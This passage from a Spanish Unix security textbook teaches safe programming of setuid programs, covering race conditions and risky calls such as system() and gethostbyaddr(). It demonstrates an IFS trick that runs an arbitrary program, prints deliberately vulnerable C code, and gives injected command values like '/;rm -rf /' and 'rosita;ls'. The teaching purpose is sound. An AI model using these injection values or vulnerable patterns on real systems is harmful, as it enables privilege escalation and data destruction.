/etc/shadow} enviando al proceso la se\~nal {\sc sigterm} y consultando el 
fichero de volcado.\\
\\No obstante, este problema no resulta tan grave como otro tambi\'en 
relacionado con los {\it core dump}: cuando un programa {\it setuidado} vuelca
su imagen el fichero resultante tiene el mismo UID que el UID real del 
proceso. Esto puede permitir a un usuario obtener un fichero con permiso de
escritura para todo el mundo pero que pertenezca a otro usuario (por ejemplo,
el {\it root}): evidentemente esto es muy perjudicial, por lo que parece claro
que en un programa {\it setuidado} necesitamos capturar todas las se\~nales que 
Unix nos permita (recordemos que {\sc sigkill} no puede capturarse ni ignorarse,
por norma general).
\item Hay que asegurarse de que las verificaciones realmente verifican.\\
Otra norma b\'asica a la hora de escribir aplicaciones {\it setuidadas} es la
desconfianza de cualquier e\-le\-men\-to ex\-ter\-no al pro\-gra\-ma; hemos de 
ve\-ri\-fi\-car siem\-pre que las entradas (teclado, fi\-che\-ros\ldots) son 
correctas, ya no en su
formato sino m\'as bien en su origen: >de qui\'en proviene un archivo del que
nuestro programa lee sus datos, de una fuente fiable o de un atacante que por
cualquier m\'etodo -- no nos importa cu\'al -- ha conseguido reemplazar ese
archivo por otro que \'el ha creado?
\item Cuidado con las recuperaciones y detecciones de errores.\\
Ante cualquier situaci\'on inesperada -- y por lo general, poco habitual, 
incluso forzada por un atacante -- un programa {\it setuidado} debe detenerse
sin m\'as; nada de intentar recuperarse del error: detenerse sin m\'as. Esto,
que quiz\'as rompe muchos de los esquemas cl\'asicos sobre programaci\'on 
robusta, tiene una explicaci\'on sencilla: cuando un programa detecta una 
situaci\'on inesperada, a menudo el programador asume condiciones sobre el error
(o sobre su causa) que no tienen por qu\'e cumplirse, lo que suele desembocar
en un problema m\'as grave que la propia situaci\'on inesperada. Para cada
posible problema que un programa encuentre (entradas muy largas, caracteres
err\'oneos o de control, formatos de datos err\'oneos\ldots) es necesario que
el programador se plantee qu\'e es lo que su c\'odigo debe hacer, y ante la 
m\'{\i}nima duda detener el programa.
\item Cuidado con las operaciones de entrada/salida.\\
La entrada/salida entre el proceso y el resto del sistema constituye otro de 
los problemas comunes en programas {\it setuidados}, especialmente a la hora
de trabajar con ficheros; las condiciones de carrera aqu\'{\i} son algo 
demasiado frecuente: el ejemplo cl\'asico se produce cuando un programa {\it
setuidado} ha de escribir en un archivo propiedad del usuario que ejecuta el
programa ({\bf no} de su propietario). En esta situaci\'on lo habitual es que
el proceso cree el fichero, realize sobre \'el un {\tt chown()} al rUID y al
rGID del proceso (es decir, a los identificadores de qui\'en est\'a ejecutando
el programa), y posteriormente escriba en el archivo; el esqueleto del c\'odigo
ser\'{\i}a el siguiente:
\begin{quote}
\begin{verbatim}
fd=open("fichero",O_CREAT);
fchown(fd,getuid(),getgid());
write(fd,buff,strlen(buff));
\end{verbatim}
\end{quote}
Pero, >qu\'e sucede si el programa se interrumpe tras realizar el {\tt open()}
pero antes de invocar a {\tt fchown()}, y adem\'as el {\tt umask} del usuario
es 0? El proceso habr\'a dejado un archivo que pertenece al propietario del
programa (generalmente el {\tt root}) y que tiene permiso de escritura para
todo el mundo. La forma m\'as efectiva de solucionar el problema consiste en
que el proceso engendre un hijo mediante {\tt fork()}, hijo que asignar\'a a sus
eUID y eGID los valores de su rUID y rGID (los identificadores del usuario que
lo ha ejecutado, no de su propietario). El padre podr\'a enviar datos a su hijo
mediante {\tt pipe()}, datos que el hijo escribir\'a en el fichero 
correspondiente: as\'{\i} el fichero en ning\'un momento tendr\'a por qu\'e 
pertenecer al usuario propietario del programa, con lo que evitamos la 
condici\'on de carrera expuesta anteriormente.
\end{itemize}
Sin embargo, un correcto estilo de programaci\'on no siempre es la soluci\'on a
los problemas de seguridad del c\'odigo; existen llamadas a sistema o funciones
de librer\'{\i}a que son un cl\'asico a la hora de hablar de {\it bugs} en 
nuestro {\it software}. Como norma, tras cualquier llamada se ha de comprobar su
valor de retorno y manejar los posibles errores que tenga asociados 
(\cite{kn:sho00}), con la evidente excepci\'on de las llamadas que est\'an 
dise\~nadas para sobreescribir el espacio de memoria de un proceso (la familia 
{\tt exec()} por ejemplo) o las que hacen que el programa finalice 
(t\'{\i}picamente, {\tt exit()}) . Algunas de las llamadas consideradas m\'as 
peligrosas (bien porque no realizan las comprobaciones necesarias, bien porque 
pueden recibir datos del usuario) son las siguientes\footnote{Que sean 
peligrosas no significa que algunas de ellas no se deban utilizar nunca, s\'olo
que si las usamos hemos de tomar unas m\'{\i}nimas precauciones.}:
\begin{itemize}
\item {\tt system()}: Esta es la llamada que cualquier programa {\it setuidado}
debe evitar a toda costa. Si aparece en un c\'odigo destinado a ejecutarse con
privilegios, significa casi con toda certeza un grave problema de seguridad; en
algunas ocasiones su peligrosidad es obvia (por ejemplo si leemos datos 
tecleados por el usuario y a continuaci\'on hacemos un {\tt system()} de esos
datos, ese usuario no tendr\'{\i}a m\'as que teclear {\tt /bin/bash} para 
conseguir los privilegios del propietario del programa), pero en otras no lo es
tanto: imaginemos un c\'odigo que invoque a {\tt system()} de una forma similar
a la siguiente:
\begin{quote}
\begin{verbatim}
#include <stdio.h>
#include <stdlib.h>

main(){
system("/bin/ls");
}
\end{verbatim}
\end{quote}
El programa anterior se limitar\'{\i}a a realizar un listado del directorio
desde el que lo ejecutemos. Al menos en teor\'{\i}a, ya que podemos comprobar
que no es dif\'{\i}cil `enga\~nar' a {\tt system()}: no tenemos m\'as que 
modificar la variable de entorno {\it \$IFS} ({\it Internal Field Separator})
del {\it shell} desde el que ejecutemos el programa para conseguir que este 
c\'odigo ejecute realmente lo que nosotros le indiquemos. Esta variable delimita
las palabras (o s\'{\i}mbolos) en una l\'{\i}nea de \'ordenes, y por defecto
suele estar inicializada a {\it Espacio}, {\it Tabulador}, y {\it Nueva 
L\'{\i}nea} (los separadores habituales de palabras); pero, >qu\'e sucede si le
indicamos al {\it shell} que el nuevo car\'acter separador va a ser la barra,
{\tt `/'}?. Muy sencillo: ejecutar {\tt `/bin/ls'} ser\'a equivalente a
ejecutar {\tt `bin ls'}, es decir, una posible orden denominada {\tt `bin'} que
recibe como par\'ametro {\tt `ls'}. Por ejemplo, bajo SunOS -- bajo la 
mayor\'{\i}a de Unices --, y utilizando {\tt sh} (no {\tt bash}) podemos hacer 
que {\tt `bin'} sea un programa de nuestra elecci\'on, como {\tt `id'}:
\begin{quote}
\begin{verbatim}
$ cp /bin/id bin
$ ejemplo 
bin  ejemplo.c  ejemplo
$ IFS=/
$ export IFS
$ ejemplo
uid=672(toni) gid=10(staff)
$ 
\end{verbatim}
\end{quote}
Como podemos ver, acabamos de ejecutar un programa arbitrario; si en lugar de
{\tt `id'} hubi\'eramos escogido un int\'erprete de \'ordenes, como {\tt `bash'}
o {\tt `sh'}, habr\'{\i}amos ejecutado ese {\it shell}. Y si el programa 
anterior estuviera {\it setudiado}, ese {\it shell} se habr\'{\i}a ejecutado
con los privilegios del propietario del archivo (si imaginamos que fuera {\tt
root}, podemos hacernos una idea de las implicaciones de seguridad que esto
representa).
\item {\tt exec()}, {\tt popen()}: Similares a la anterior; es preferible 
utilizar {\tt execv()} o {\tt execl()}, pero si han de recibir par\'ametros del
usuario sigue siendo necesaria una estricta comprobaci\'on de los mismos.
\item {\tt setuid()}, {\tt setgid()}\ldots: Los programas de usuario no 
deber\'{\i}an utilizar estas llamadas, ya que no han de tener privilegios 
innecesarios.
\item {\tt strcpy()}, {\tt strcat()}, {\tt sprintf()}, {\tt vsprintf()}\ldots: 
Estas funciones no comprueban la longitud de las cadenas con las que trabajan, 
por lo que son una gran fuente de {\it buffer overflows}. Se han de sustituir
por llamadas equivalentes que s\'{\i} realicen comprobaci\'on de l\'{\i}mites
({\tt strncpy()}, {\tt strncat()}\ldots) y, si no es posible, realizar dichas
comprobaciones manualmente.
\item {\tt getenv()}: Otra excelente fuente de desbordamientos de {\it buffer};
adem\'as, el uso que hagamos de la informaci\'on le\'{\i}da puede ser peligroso,
ya que recordemos que es el usuario el que generalmente puede modificar el valor
de las variables de entorno. Por ejemplo, >qu\'e suceder\'{\i}a si ejecutamos
desde un programa una orden como {\tt `cd \$HOME'}, y resulta que esta variable
de entorno no corresponde a un nombre de directorio sino que es de la forma
{\tt `/;rm -rf /'}? Si algo parecido se hace desde un programa que se ejecute
con privilegios en el sistema, podemos imaginarnos las consecuencias\ldots
\item {\tt gets()}, {\tt scanf()}, {\tt fscanf()}, {\tt getpass()}, {\tt 
realpath()}, {\tt getopt()}\ldots: Estas funciones no realizan las 
comprobaciones adecuadas de los datos introducidos, por lo que pueden desbordar
en algunos casos el {\it buffer} destino o un {\it buffer} est\'atico interno
al sistema. Es preferible el uso de {\tt read()} o {\tt fgets()} siempre que sea
posible (incluso para leer una contrase\~na, haciendo por supuesto que no se 
escriba en pantalla), y si no lo es al menos realizar manualmente comprobaciones
de longitud de los datos le\'{\i}dos. 
\item {\tt gethostbyname()}, {\tt gethostbyaddr()}: Seguramente ver las amenazas
que provienen del uso de estas llamadas no es tan inmediato como ver las del
resto; generalmente hablamos de desbordamiento de {\it buffers}, de 
comprobaciones de l\'{\i}mites de datos introducidos por el usuario\ldots pero
no nos paramos a pensar en datos que un atacante no introduce directamente 
desde teclado o desde un archivo, pero cuyo valor puede forzar incluso desde
sistemas que ni siquiera son el nuestro. Por ejemplo, todos tendemos a asumir
como ciertas las informaciones que un servidor DNS -- m\'as o menos fiables, por
ejemplo alguno de nuestra propia organizaci\'on -- nos brinda. Imaginemos un 
programa como
el siguiente (se han omitido las comprobaciones de errores habituales por 
cuestiones de claridad):
\begin{quote}
\begin{verbatim}
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char **argv){
struct in_addr *dir=(struct in_addr *)malloc(sizeof(struct in_addr));
struct hostent *maquina=(struct hostent *)malloc(sizeof(struct \
        hostent));
char *orden=(char *)malloc(30);
dir->s_addr=inet_addr(*++argv);
maquina=gethostbyaddr((char *)dir,sizeof(struct in_addr),AF_INET);
sprintf(orden,"finger @%s\n",maquina->h_name);
system(orden);
return(0);
}
\end{verbatim}
\end{quote}
Este c\'odigo recibe como argumento una direcci\'on IP, obtiene su nombre 
v\'{\i}a {\tt /etc/hosts} o {\sc dns},y ejecuta un {\tt finger} sobre dicho 
nombre; aparte de otros posibles problemas de seguridad (por ejemplo, 
>ser\'{\i}amos capaces de procesar {\bf cualquier} informaci\'on que devuelva
el {\tt finger}?, >qu\'e sucede con la llamada a {\tt system()}?), nada 
extra\~no ha de suceder si el nombre de m\'aquina devuelto al programa es 
`normal':
\begin{quote}
\begin{verbatim}
luisa:~/tmp$ ./ejemplo 192.168.0.1
[rosita]
No one logged on.
luisa:~/tmp$ 
\end{verbatim}
\end{quote}
Pero, >qu\'e pasar\'{\i}a si en lugar de devolver un nombre `normal' (como {\tt
`rosita'}) se devuelve un nombre algo m\'as elaborado, como {\tt `rosita;ls'}?
Podemos verlo:
\begin{quote}
\begin{verbatim}
luisa:~/tmp$ ./ejemplo 192.168.0.1
[rosita;ls]
No one logged on.
ejemplo  ejemplo.c
luisa:~/tmp$ 
\end{verbatim}
\end{quote}
Exactamente: se ha ejecutado la orden {\tt `finger @rosita;ls'} (esto es, un
{\tt `finger'} a la m\'aquina seguido de un {\tt `ls'}). Podemos imaginar los
efectos que tendr\'{\i}a el uso de este programa si sustituimos el inocente {\tt
`ls'} por un {\tt `rm -rf \$HOME'}. Un atacante que consiga controlar un 
servidor {\sc dns} (algo no muy complicado) podr\'{\i}a inyectarnos datos 
maliciosos en nuestra m\'aquina sin ning\'un problema. Para evitar esta 
situaci\'on debemos hacer una doble b\'usqueda inversa y adem\'as no hacer 
ninguna suposici\'on sobre la correcci\'on o el formato de los datos recibidos;
en nuestro c\'odigo debemos insertar las comprobaciones necesarias para 
asegurarnos de que la informaci\'on que recibimos no nos va a causar problemas.
\item {\tt syslog()}: Hemos de tener la precauci\'on de utilizar una versi\'on
de esta funci\'on de librer\'{\i}a que compruebe la longitud de
sus argumentos; si no lo hacemos y esa longitud sobrepasa un cierto 
l\'{\i}mite (generalmente, 1024 {\it bytes}) podemos causar un desbordamiento en
los {\it buffers} de nuestro sistema de {\it log}, dej\'andolo inutilizable.
\item {\tt realloc()}: Ning\'un programa -- privilegiado o no -- que maneje 
datos sensibles (por ejemplo, contrase\~nas, correo electr\'onico\ldots y
especialmente aplicaciones criptogr\'aficas) debe utilizar esta llamada; {\tt
realloc()} se suele utilizar para aumentar din\'amicamente la cantidad de 
memoria reservada para un puntero. Lo habitual es que la nueva zona de memoria 
sea contigua a la que ya estaba reservada, pero si esto no es posible {\tt
realloc()} copia la zona antigua a una nueva ubicaci\'on donde pueda a\~nadirle
el espacio especificado. >Cu\'al es el problema? La zona de memoria antigua se 
libera (perdemos el puntero a ella) pero no se pone a cero, con lo que sus
contenidos permanecen inalterados hasta que un nuevo proceso reserva esa zona; 
accediendo a bajo nivel a la memoria (por ejemplo, leyendo {\tt /proc/kcore} o 
{\tt /dev/kmem}) ser\'{\i}a posible para un atacante tener acceso a esa 
informaci\'on.\\
Realmente, {\tt malloc()} tampoco pone a cero la memoria reservada, por lo que a
primera vista puede parecer que cualquier proceso de usuario (no un acceso a 
bajo nivel, sino un simple {\tt malloc()} en un programa) podr\'{\i}a permitir
la lectura del antiguo contenido de la zona de memoria reservada. Esto es falso
si se trata de nueva memoria que el n\'ucleo reserva para el proceso invocador:
en ese caso, la memoria es limpiada por el propio {\it kernel} del operativo,
que invoca a {\tt kmalloc()} (en el caso de Linux, en otros Unices el nombre
puede variar aunque la idea sea la misma) para hacer la reserva. Lo que s\'{\i} 
es posible es que si 
liberamos una zona de memoria (por ejemplo con {\tt free()}) y a continuaci\'on
la volvemos a reservar, en el mismo proceso, podamos acceder a su contenido: esa
zona no es `nueva' (es decir, el n\'ucleo no la ha reservado de nuevo), sino 
que ya pertenec\'{\i}a al proceso. De cualquier forma, si vamos a liberar una
zona en la que est\'a almacenada informaci\'on sensible, lo mejor en cualquier
caso es ponerla a cero manualmente, por ejemplo mediante {\tt bzero()} o {\tt
memset()}.
\item {\tt open()}: El sistema de ficheros puede modificarse durante la 
ejecuci\'on de un programa de formas que en ocasiones ni siquiera imaginamos;
por ejemplo, en Unix se ha de evitar escribir siguiendo enlaces de archivos
inesperados (un archivo que cambia entre una llamada a {\tt 
lstat()} para comprobar si existe y una llamada a {\tt open()} para abrirlo en
caso positivo, como hemos visto antes). No obstante, no hay ninguna forma de
realizar esta operaci\'on at\'omicamente sin llegar a mecanismos de 
entrada/salida de muy bajo nivel; Peter Gutmann propone el siguiente c\'odigo
para asegurarnos de que estamos realizando un {\tt open()} sobre el archivo que
realmente queremos abrir, y no sobre otro que un atacante nos ha puesto en su
lugar:
\begin{quote}
\begin{verbatim}
struct stat lstatInfo;
char *mode="rb+";
int fd;

if(lstat(fileName,&lstatInfo)==-1)
    {
    if(errno!=ENOENT) return( -1 );
    if((fd=open(fileName,O_CREAT|O_EXCL|O_RDWR,0600))==-1) return(-1);
    mode="wb";
    }
else
    {
    struct stat fstatInfo;
    if((fd=open(fileName,O_RDWR))==-1) return(-1);
    if(fstat(fd,&fstatInfo)==-1 || \
       lstatInfo.st_mode!=fstatInfo.st_mode || \
       lstatInfo.st_ino!=fstatInfo.st_ino || \
       lstatInfo.st_dev!=fstatInfo.st_dev)
       {
       close(fd);
       return(-1);
       }
    if(fstatInfo.st_nlink>1||!S_ISREG(lstatInfo.st_mode))
       {
       close(fd);
       return(-1);
       }
#ifdef NO_FTRUNCATE
    close(fd);
    if((fd=open(fileName,O_CREAT|O_TRUNC|O_RDWR))==-1) return( -1 );
    mode="wb";
#else
    ftruncate(fd,0);
#endif /* NO_FTRUNCATE */
    }
stream->filePtr=fdopen(fd,mode);
if(stream->filePtr==NULL)
    {
    close(fd);
    unlink(fileName);
    return(-1);  /* Internal error, should never happen */
    }
}
\end{verbatim}
\end{quote}
Como podemos ver, algo tan elemental como una llamada a {\tt open()} se ha 
convertido en todo el c\'odigo anterior si queremos garantizar unas m\'{\i}nimas
medidas de seguridad; esto nos puede dar una idea de hasta que punto la 
programaci\'on `segura' puede complicarse. No obstante, en muchas ocasiones es
preferible toda la complicaci\'on y parafernalia anteriores para realizar un 
simple {\tt open()} a que esa llamada se convierta en un fallo de seguridad en
nuestro sistema. No hay ning\'un programa que se pueda considerar perfecto o
libre de errores (como se cita en el cap\'{\i}tulo 23 de \cite{kn:spa96}, una
rutina de una librer\'{\i}a puede tener un fallo\ldots o un rayo gamma puede
alterar un {\it bit} de memoria para hacer que nuestro programa se comporte de
forma inesperada), pero cualquier medida que nos ayude a minimizar las 
posibilidades de problemas es siempre positiva.
\end{itemize}
